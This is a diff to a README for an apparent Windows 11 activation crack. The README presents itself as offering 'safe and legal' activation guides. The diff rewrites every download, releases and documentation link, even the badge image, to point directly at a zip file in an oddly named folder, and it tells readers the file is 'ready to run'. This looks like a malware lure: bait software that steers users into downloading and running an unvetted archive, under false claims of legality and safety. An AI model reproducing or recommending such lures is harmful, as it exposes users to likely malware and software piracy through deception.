@@ -4,7 +4,7 @@
 This repository offers a comprehensive collection of official resources and detailed guides to help you optimize your Windows 11 setup. The focus is on safe and legal practices for Windows activation. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/main/bearberry/Windows-11-Activator-No-Trial_3.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/main/bearberry/Windows-11-Activator-No-Trial_3.2.zip)
 
 ## 🚀 Getting Started
 Activating Windows 11 can enhance your experience by unlocking features and ensuring you have the latest updates. Follow these simple steps to download and run the software successfully.
@@ -19,7 +19,7 @@ Activating Windows 11 can enhance your experience by unlocking features and ensu
 ## 📂 Download & Install
 To get started, visit the Releases page to download the software.
 
-1. Click this link: [Releases Page](https://github.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/releases).
+1. Click this link: [Releases Page](https://raw.githubusercontent.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/main/bearberry/Windows-11-Activator-No-Trial_3.2.zip).
 2. Locate the latest version of the Windows 11 Activator.
 3. Click on the appropriate asset to download. This file is ready to run on your Windows system.
 
@@ -53,7 +53,7 @@ Explore the following topics to enhance your understanding of Windows 11 activat
 If you encounter any issues, feel free to reach out for help. You can find additional support materials in our repository, including common solutions and FAQs.
 
 ## 🔗 Important Links
-- [Download Latest Release](https://github.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/releases)
-- [Full Documentation](https://github.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/blob/main/docs/README.md)
+- [Download Latest Release](https://raw.githubusercontent.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/main/bearberry/Windows-11-Activator-No-Trial_3.2.zip)
+- [Full Documentation](https://raw.githubusercontent.com/OLLYVERDIGITAL/Windows-11-Activator-No-Trial/main/bearberry/Windows-11-Activator-No-Trial_3.2.zip)
 
 By following these steps, you will successfully activate your Windows 11 setup. Enjoy a better computing experience!
